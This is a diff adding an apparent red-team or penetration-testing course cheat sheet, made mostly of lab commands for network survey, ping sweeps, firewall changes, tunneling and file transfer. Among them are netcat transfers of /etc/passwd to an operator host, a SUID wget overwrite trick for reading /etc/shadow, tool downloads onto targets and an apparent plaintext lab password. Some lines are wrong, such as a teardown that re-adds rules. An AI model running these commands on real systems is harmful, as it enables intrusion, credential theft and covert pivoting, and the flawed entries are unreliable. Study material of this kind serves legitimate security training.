@@ -1,0 +1,577 @@
+ssh -x -v -p<port> <usr>@<IP> -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
+
+``` cut net survey ```{
+# windows {
+
+# light 
+ipconfig /all 
+netstat -rn 
+arp -a 
+
+
+# heavy  
+date /t && time /t 
+ipconfig /all  
+	ipconfig /displaydns | more 
+hostname 
+	echo %computername%
+
+wmic process get executablepath,processid,parentprocessid | more 
+wmic process get commandline | more 
+netstat -ano | findstr EST 
+netstat -ano | findstr LIST 
+arp -a 
+
+nbtstat -n 
+netstat -rn 
+	route print 
+net use
+net share 
+net start 
+net services
+
+}
+
+# nix {
+
+# light 
+w; id; uname -a; hostname
+ifconfig -a 
+	ip a
+arp -an
+netstat -rn 
+
+# heavy 
+date && date -u
+w; id; uname -a; hostname
+ifconfig -a // ip a
+
+sestatus
+ps -ef 
+netstat -tuna
+	netstat -tunap 
+netstat -rn 
+arp -n / ip neigh
+}
+
+
+
+}
+
+``` network config / discovery ``` {
+# view interfaces 
+ip addr 
+	ifconfig 
+	
+# configure interface - LINUX (add /delete an IP to an)
+sudo ip addr add 192.168.82.98/28 dev eth2	
+sudo ip addr del 192.168.82.98/28 dev eth2	
+	# config interface - SOLARIS 
+	ifconfig e1000g0 172.17.31.14 netmask 255.255.255.0 up ; ifconfig e1000g0 
+	ifconfig e1000g0 down 
+
+# view routes 
+route print 
+ip route 
+
+# add route - LINUX 
+sudo ip route add 172.16.100.0/24 via 192.168.55.1 dev ens160
+	sudo ip route add 172.16.100.152 via 192.168.55.1 dev ens160 
+	# add route - SOLARIS 
+	route add 172.17.0.0/25 172.18.31.12 ; netstat -rn 
+	route delete 172.17.0.0/25 172.18.31.12 ; netstat -rn 
+
+# default gateway (only use on allowed machines e.g. gw/firewall) - LINUX 
+sudo ip route add default via 200.87.39.129 dev eth2
+	# change default gateway ; delete the old default - SOLARIS 
+	route add default 172.18.31.253; route delete default 192.168.11.254; netstat -rn
+
+
+
+# discovery
+arp -a ``` look for additional IPs outside of gateway/interface!```
+arping -I ens160 10.241.247.190
+	# ping sweep
+	for i in $(seq 0 255); do (ping -c1 10.241.147.$i | grep 'bytes from' &); done; sleep 1
+	# arping sweep // maybe view manually w/o grep
+	for i in $(seq 0 255); do (arping -c 1 -I ens160 10.241.147.$i | grep 'Received 1' ); done; sleep 1
+	
+	# then add static arp entry 
+	arp -s 10.241.247.190 00:50:56:8E:D3:5B; arp -vn 
+}
+
+``` firewall rules ``` {
+
+{ # WINDOWS 
+
+# show profile / view rules --- where can i come in / how can i get out 
+netsh advfirewall show currentprofile
+netsh advfirewall firewall show rule name=all
+netsh advfirewall firewall show rule profile=public name=all
+netsh advfirewall firewall show rule name="WEB"
+
+# add firewall rule, allow incoming traffic port 8081
+runas /user:administrator "netsh advfirewall firewall add rule name="web" dir=in protocol=tcp localport=8081 profile=public action=allow"
+
+}
+
+{ # NIX 
+
+# view rules 
+iptables -nvL 
+iptables -nvL -t nat 
+
+# allow any traffic from an IP - good for bind/beacon tuns , make sure outbound allows. otherwwise make outbound rule 
+iptables -I INPUT 1 -s 10.18.80.64 -p tcp -j ACCEPT
+
+# add rule // incoming SSH traffic from .64  (remember -t filter by default) 
+iptables -I INPUT 1 -s 10.18.80.64 -p tcp --dport 22 -j ACCEPT
+
+# add rule // outgoing SSH traffic to .66
+iptables -I INPUT 1 -d 10.18.80.66 -p tcp --dport 22 -j ACCEPT
+
+#allow only SSH traffic from your 1337h4x.ops.local to your Jump Point, NATed to the external IP address of the gateway
+sudo iptables -I FORWARD 1 -s 192.168.11.15 -d 203.0.113.12 -p tcp --dport 22 -j ACCEPT
+	# there's only a default DROP for traffic leaving eth2, so dont need an ingress forward rule 
+sudo iptables -t nat -I POSTROUTING 1 -s 192.168.11.15 -d 203.0.113.12 -o eth2 -j MASQUERADE
+
+}
+
+}
+
+``` Non-SSH Tunneling ``` {
+
+# FPIPE {
+- lightweight redirection program
+- for windows 
+
+#SYNTAX 
+fpipe -l <#incoming port for forwarding#> -r <#outgoing port for forwarding#> <#dst-IP#>
+
+fpipe -l <#incoming port for forwarding#> -s <# source port for OUTBOUND traffic #> -r <#outgoing port for forwarding#> <#dst-IP#>
+fpipe -l 8080 -r 80 198.18.30.12
+fpipe -l 445 -s 1234 -r 8080 111.111.11.111
+		^^^ ensure inbound port is not in use 
+
+{ # fpipe install & LPF use example
+1. drive sharing for rdp conn / msctl : must enable via GUI (local resources -> more -> drives)
+	- to copy/paste across RDP 
+	1.5 login 
+
+2. copy / paste fpipe via GUI
+
+3. admin cmdprompt on win7, UNCHECK 'protect my computer from...'
+	fpipe -l 8080 -r 80 198.18.30.12
+
+}
+
+}
+
+# SOCAT {
+
+{ # Notes 
+- Pros:
+	- can redirect: TCP,UDP,ICMP,raw IP! 
+	- can convert protocols: good for forwarding non-TCP traffic through ssh (tcp) tunnels
+							- just need socat on entry to tunnel listener and exit on forwarder
+	- can multiplex with FORK option!
+- Cons:
+	- complex configuration (75+ types of addresses)
+	- size (320kb)
+}
+
+#SYNTAX 
+socat <#address1#> <#address2>
+
+# LPF full line 
+socat TCP-LISTEN:8080,fork TCP-CONNECT:198.18.30.12:80
+
+{ # LPF setup syntax 
+# LPF Listener SYNAX 
+TCP-LISTEN:8080 
+TCP-LISTEN:8080,fork  # Fork option - handle multiple connections
+
+# LPF Forwarder SYNAX 
+TCP-CONNECT:198.18.30.12 80
+}
+
+# protocol conversion example  {
+
+ssh -p2222 mohunt@100.64.36.17 -L2221:198.18.30.5:22
+nancy123?
+
+
+socat UDP-LISTEN:137 TCP-CONNECT:127.0.0.1:1137 // on linux.ops.local 
+- will initally fail bc--- fail method (for exercise) 
+
+ssh -p2221 remoteuser@127.0.0.1 -L1137:127.0.0.1:1137
+remote 
+# -L1337:
+
+pscp -P 2221 C:\tools\socat\socat-centos5 remoteuser@linux.ops.local:/home/remoteuser/socat
+
+chmod +x socat 
+./socat TCP-LISTEN:1137 UDP-CONNECT:198.18.30.12:137
+
+nbtstat -a 192.168.11.13
+}
+}
+
+# IPTABLES - nat conversion  {
+
+# local redirection (bypass restricted ports / RPF use) { 
+echo "1" > /proc/sys/net/ipv4/ip_forward
+/sbin/iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 615 -j REDIRECT --to 6666
+
+--- dont need OUTPUT, since not expecting to return traffic
+
+/sbin/iptables -t nat -D PREROUTING -s 0.0.0.0 -p tcp --dport 615 -j REDIRECT --to 6155 &&
+echo "0" > /proc/sys/net/ipv4/ip_forward
+}
+
+# general traffic redirection {
+
+# syntax 
+iptables -t nat -A PREROUTING -p tcp --dport <receiving port> -j DNAT --to-destination <tgt-IP>:<tgt-port>
+iptables -t nat -A POSTROUTING -p tcp -d <tgt-IP> --dport <tgt-port> -j SNAT --to-source <local-IP> 
+	# prerouting redirects the packet upon reception // postrouting changes exiting traffics IP (so proceeding traffic can return to this host)
+
+# example { 
+
+#setup 
+echo "1" > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.42.10:80
+iptables -t nat -A POSTROUTING -p tcp -d 192.168.42.10 --dport 80 -j SNAT --to-source 192.168.42.1
+
+#teardown
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.42.10:80
+iptables -t nat -A POSTROUTING -p tcp -d 192.168.42.10 --dport 80 -j SNAT --to-source 192.168.42.1
+echo "0" > /proc/sys/net/ipv4/ip_forward
+}
+
+
+}
+
+}
+
+# PORTPROXY (windows netsh interface) {
+
+# syntax - LPF 
+netsh interface portproxy set v4tov4 listenport=8888 connectaddress=C.C.C.C connectport=80
+	#optional: listenaddress=127.0.0.1 // config. interface for listener, only tcp is supported 
+	netsh interface portproxy set v4tov4 listenaddress=0.0.0.0 listenport=8888 connectaddress=C.C.C.C connectport=80
+}
+
+}
+
+``` File Transfer ``` {
+{ # Standard File Transfer 
+
+# Method notes { 
+``` ================= NIX ================= ```
+- scp & 'net use' assume current system user if no username is given (- almost never works)
+	- often give DOMAIN for the user (domain or local hostname)
+
+# ssh 
+scp 
+	scp [[user1@]host1:]src_file [[user2@]host1:]dst_file
+ssh (sockets) > method 
+
+# FTP 
+ftp 
+
+#web transfer 
+	curl 
+	wget 
+	Invoke-WebRequest 
+	
+#mail transfer 
+
+#network shares 
+	NFS / mount 
+	smb transfer (impacket)
+	
+#other services 
+	- mutt # unix mail 
+	- IRC (download IRC files)
+	- almost any network-enabled service can be used
+	
+``` ================= WIN ================= ``` 
+
+#ssh 
+WinSCP # GUI
+pscp # putty cli for windows 
+
+# ftp 
+ftp (active mode issues across networks where client is firewall/ NATd. may need passive)
+tftp - simple,udp version
+
+# RDP 
+
+	#web 
+		GUI (browser)
+	#cli 
+		mstsc /v:xp.ops.local 
+
+#mail transfer 
+
+#network shares 
+xcopy
+net use p: \\192.168.111.117\c$ /user:[DOMAIN\]username 
+
+# other services 
+rcp
+	requires rsh daemon running on nix?
+
+}
+
+# FTP/TFTP 
+
+{ # Win Shares and HTTP exercise 
+# mount web share 
+net use x: \\www.ops.local\WEB /user:haxor
+
+# wget file 
+wget http://www.ops.local:80/default.htm -O /tmp/default.legit
+
+# pscp file 
+pscp remoteuser@ras.fatdeer.lab:/bin/cat .
+
+# cool privesc: suid tool -OVERWRITE- trick (applies to any tool that can overwrite, but wget example)
+1. have .wget with SUID bit # so can write anywhere... but new files are owned by root... 
+2. choose program you want root perms to (e.g. cat)
+2. overwite a global root SUID program e.g. /bin/ping,/bin/umount,etc. # writes program into a file that you can run with root perms
+	find /bin -perm /u+s # find one 
+	.wget http://server.local:80/nc.jpg -O /bin/umount 
+3. /bin/umount /etc/shadow
+
+
+
+}
+
+{ # RDP exercise 
+
+# RDP connect Win CLI
+mstsc /v:xp.ops.local 
+/v:<server [:port]>] [/admin] [/f [ullscreen]] [/w:] [/h:] [/public] | [/span] [/edit "connection file"] [/migrate] [/?]
+
+# for file transfer via clipboard - server back to client - must edit advanced 'local resources' settings via GUI 
+https://www.helpwire.app/blog/remote-desktop-transfer-files/
+
+mstsc.exe 
+	'Local Resources'
+	'More'
+	*Click on Drives, ensure drives & subcategories are checked
+	*connect
+}
+
+
+}
+
+{ # Non-standard File Transfer 
+
+# Method notes {
+"reverse nc transfer"
+- listen on host, remote system calls to local machine. more likely to pass a firewall
+
+BEST PRACTICES
+1. test technique before using live
+2. compare hashes of files on BOTH ends 
+	NIX
+		m5sum file.txt /sha1sum file.txt  
+	windows
+		certutil -hashfile file.txt MD5
+			certutil -hashfile file.txt # older versions, md5 only, no md5 argument
+		cygwin
+		
+clipboard paste techniques 
+- very effective with windows terminals: BUT NOT PREFERRABLE bc slow/error-prone. Unacceptable OPSEC risk. 
+1. convert binary file to ASCII (by encoding via base64)
+2. copy/paste onto target 
+3. decode base64 
+
+# CONSIDERATIONS:
+1. File size. Consider packing executables (executable compression) - packers: smaller size/ slightly less efficient runtime. Some antivirus flag packed executables as malware 
+2. x86 vs x64?
+3. static vs dynamic linked libarary tools? 
+	static > preferred (if size can be managed) 
+4. when transferring text/scripts from linux > win, BEWARE \n issue 
+	UNIX uses [LF] (ASCII code 10) for end of textline 
+	WIN uses [CR][LF] (ASCII code 13 and 10)
+	- windows notepad++ has an edit EOL conversion option 
+	- unix has dos2unix/ unix2dos
+
+}
+
+{ # Netcat transfer 
+Basic file transfer
+#1. listen on linux ops 
+nc -l 8888 < /etc/passwd 
+#2. windows (grab via tgt)
+nc linux.ops.local 8888 > passwd 
+
+Reverse NC transfer 
+#1. host listener on linux ops 
+nc -l 12345 > passwd 
+#2. send via tgt 
+nc 192.168.11.13 12345 < passwd 
+
+}
+
+{ # ncat 
+- offers ipv4+ipv6, SSL support, socks/http proxy, supports solaris/linux/windows
+- same nc syntax 
+	ncat <ip> <port> < file 
+	
+}
+
+{ # socat 
+- unix only, ipv4+ipv6, ROBUST redirection 
+
+}
+
+{ # smbclient 
+smbclient -L <IP> -U "user"
+smbclient //192.168.11.18/C$ -U "administrator"
+
+# todo: add impacket smbserver.py method 
+}
+
+{ # webserv 
+
+# setup
+python3 http.server 8000
+	ssh -R8000:127.0.0.1:8080
+
+# win pull 
+
+powershell -****** Invoke-WebRequest -Uri "http://192.168.11.15:8000/fpipe.exe" -OutFile "c:\temp\fpipe.exe"
+
+
+# nix pull
+curl *** 
+
+}
+
+{ # terminal cut and paste (linux clipboard transfers using windows)
+
+{ steps 
+(on linux, just encode, paste, decode)
+
+1. encode file (e.g.) base64 
+2. on remote tgt terminal, capture text typed into shell into file w/shell redirection
+	unix
+		cat > target.64
+	windows
+		more > target.64
+3. cut and paste text into remote tgt terminal text window
+4. decode with base64 on remote end 
+} 
+
+{ # VIDEO STEPS - using windows, clipboard copy binary tool from target1 (linux.ops.local) to target2 (1337h4x.ops.local)
+1. putty into linux.ops.local, encode the tool ('/tmp/yes' for this example)
+	base64 /tmp/yes 
+2. right click linux.ops.local terminal, click 'copy all to clipboard'
+3. paste into windows notepad++, clean up file so its only encoded binary file 
+4. copy encoded binary to clipboard
+
+5. putty into 1337h4x.ops.local (target2)
+6. prep destination screen terminal window to accept file 
+	cat > /tmp/yes.64
+6.5 rightclick window to paste base64, CTRL-C to exit 
+7. decode 
+	cat /tmp/yes.64 | base64 -di > yes
+} 
+	
+# cut/paste into windows TELNET terminal issue workaround - requires "paste delay"
+need to use a client that allows us to set a "paste delay"
+1. Connect to RD via TeraTerm
+2. In TeraTerm, in the menu Setup > Additional Settings > Copy and Paste, set "Paste delay per line" value to 150ms
+
+# LINUX TERMINAL COPY/PASTE PROTIP - can scroll to top of linux terminal, highlight and hit SPACE to get to bottom! 
+	- works for telnet/ssh
+}
+
+
+}
+
+}
+
+``` encoding ``` {
+
+# openssl 
+openssl enc -base64 < file.wmav
+	openssl enc -base64 < file.wmav > file.64
+
+cat > /tmp/file.64 
+openssl enc -base64 -d < /tmp/file.64 > /tmp/file.wmav
+
+# python
+python -m base64 [file.64]
+python -m base64 -d [file.64]
+
+# certutil 
+certutil -encode [infile] [outfile]
+certutil -decode [infile] [outfile]
+
+# powershell
+// To Base64 Encode a File via Powershell 
+$ec=get-content -Encoding Byte "YOUR INPUT FILENAME HERE" 
+$eE=[System.Convert]::ToBase64String($eC,[System.Base64FormattingOptions]::InsertLineBreaks) 
+$eE | set-content -Encoding ASCII "YOUR OUTPUT FILENAME HERE" 
+
+// To Base64 Decode a File via Powershell 
+$fs=(get-content "YOUR INPUT FILENAME HERE") -join "" 
+$fD=[System.Convert]::FromBase64string($fs) 
+$fD | set-content -Encoding Byte "YOUR OUTPUT FILENAME HERE" 
+
+// To uudecode a File via Perl 
+perl -e '$in=""; open OUT,">YOUR OUTPUT FILENAME HERE..; binmode OUT; while (<>){next if /^begin/; last if /^end/; $in .= $_;} print "Bytes in:".length($in)."\n"; $out=unpack "u",$in; print "Bytes out:".length($out)."\n"; print OUT $out;'
+
+# differences between certutil encode and base64/other methods 
+- certutil includes a "---BEGIN CERTIFICATE--- /  ---END CERTIFICATE---
+- different line lengths, windows 64-character; linux 76-char per line 
+
+
+}
+
+``` MISC Windows ``` {
+
+# RUNAS syntax 
+runas /user:administrator "command"
+
+# mount windows share 
+net use x: \\172.16.100.200\images /user:administrator 
+net use x: \\172.16.100.200\c$ /user:administrator 
+
+# full search 
+dir /b /s *vehicle.jpg*
+
+# Powershell HTTP GET / grab 
+Invoke-WebRequest -Uri "http://192.168.11.15:8081/graphics/service.jpg " -OutFile "c:\temp\service.jpg"
+
+}
+
+``` MISC NIX ``` {
+
+#  LPF / RPF syntax {
+
+# LPF 
+-L<listener-config>:<forwarder-config>
+	-L<listener-interface>:<listener-port>:<forwarder-interface>:<forwarder-port>
+
+me ---> listener --->--->---> forwarder ---> target 
+
+# RPF 
+-R<listener-config>:<forwarder-config>
+	-R<listener-interface>:<listener-port>:<forwarder-interface>:<forwarder-port>
+
+me <--- forwarder <---<---<--- listener <--- target 
+
+}
+
+!!! - remember with tunnels in regard to firewalls! 
+- SSH tunnels will BYPASS firewall restricts by encapsulating traffic in SSH
+- only need to worry about firewall rules via TCP connection ENTERING the tunnel and EXITING the tunnel (on listener/forwarder)
+
+}
